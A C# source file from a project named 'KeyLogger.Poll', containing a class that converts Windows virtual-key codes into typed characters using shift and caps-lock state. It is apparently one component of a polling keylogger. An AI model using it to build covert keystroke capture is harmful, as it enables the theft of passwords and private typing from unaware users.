using System;
using System.Collections.Generic;

namespace KeyLogger.Poll
{
    /// <summary>
    /// Maps virtual-key codes to display text, similar to the Delphi ListView lookup table.
    /// </summary>
    public sealed class VirtualKeyMap
    {
        private readonly Dictionary<int, string> _fixedMappings = new Dictionary<int, string>();

        public VirtualKeyMap()
        {
            LoadDefaultMappings();
        }

        public void SetMapping(int virtualKeyCode, string displayText)
        {
            _fixedMappings[virtualKeyCode] = displayText;
        }

        public bool TryGetDisplayText(int virtualKeyCode, out string displayText)
        {
            if (_fixedMappings.TryGetValue(virtualKeyCode, out displayText))
                return true;

            displayText = null;

            if (virtualKeyCode >= 'A' && virtualKeyCode <= 'Z')
            {
                displayText = ResolveLetter((char)virtualKeyCode);
                return true;
            }

            if (virtualKeyCode >= '0' && virtualKeyCode <= '9')
            {
                displayText = ResolveDigit(virtualKeyCode);
                return true;
            }

            return false;
        }

        private static string ResolveLetter(char letter)
        {
            bool shift = IsKeyDown(NativeMethods.VK_SHIFT);
            bool caps = (NativeMethods.GetKeyState(NativeMethods.VK_CAPITAL) & 0x0001) != 0;
            bool upper = shift ^ caps;
            return upper ? letter.ToString() : char.ToLower(letter).ToString();
        }

        private static string ResolveDigit(int virtualKeyCode)
        {
            if (!IsKeyDown(NativeMethods.VK_SHIFT))
                return ((char)virtualKeyCode).ToString();

            switch (virtualKeyCode)
            {
                case '1': return "!";
                case '2': return "@";
                case '3': return "#";
                case '4': return "$";
                case '5': return "%";
                case '6': return "^";
                case '7': return "&";
                case '8': return "*";
                case '9': return "(";
                case '0': return ")";
                default: return ((char)virtualKeyCode).ToString();
            }
        }

        private static bool IsKeyDown(int virtualKeyCode)
        {
            return (NativeMethods.GetAsyncKeyState(virtualKeyCode) & 0x8000) != 0;
        }

        private void LoadDefaultMappings()
        {
            SetMapping(NativeMethods.VK_BACK, string.Empty);
            SetMapping(NativeMethods.VK_TAB, "\t");
            SetMapping(NativeMethods.VK_RETURN, Environment.NewLine);
            SetMapping(NativeMethods.VK_SPACE, " ");
            SetMapping(NativeMethods.VK_ESCAPE, "[Esc]");

            SetMapping(NativeMethods.VK_SHIFT, string.Empty);
            SetMapping(NativeMethods.VK_CONTROL, string.Empty);
            SetMapping(NativeMethods.VK_MENU, string.Empty);
            SetMapping(0xA0, string.Empty); // VK_LSHIFT
            SetMapping(0xA1, string.Empty); // VK_RSHIFT
            SetMapping(0xA2, string.Empty); // VK_LCONTROL
            SetMapping(0xA3, string.Empty); // VK_RCONTROL
            SetMapping(0xA4, string.Empty); // VK_LMENU
            SetMapping(0xA5, string.Empty); // VK_RMENU

            SetMapping(0xBA, ";");
            SetMapping(0xBB, "=");
            SetMapping(0xBC, ",");
            SetMapping(0xBD, "-");
            SetMapping(0xBE, ".");
            SetMapping(0xBF, "/");
            SetMapping(0xC0, "`");
            SetMapping(0xDB, "[");
            SetMapping(0xDC, "\\");
            SetMapping(0xDD, "]");
            SetMapping(0xDE, "'");
        }
    }
}
